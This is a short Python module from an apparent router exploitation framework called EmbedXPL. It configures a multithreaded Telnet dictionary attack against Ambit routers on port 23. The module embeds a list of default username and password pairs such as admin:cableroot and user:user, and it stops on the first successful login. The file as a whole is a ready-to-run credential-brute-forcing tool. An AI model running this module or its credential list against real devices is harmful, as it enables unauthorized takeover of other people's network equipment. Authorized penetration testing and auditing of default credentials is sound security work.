# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Ambit Router Default Telnet Creds",
        "description": "Dictionary attack with default credentials against Ambit Router Telnet service.",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Ambit Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:cableroot,admin:user,user:cableroot,user:user,root:", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
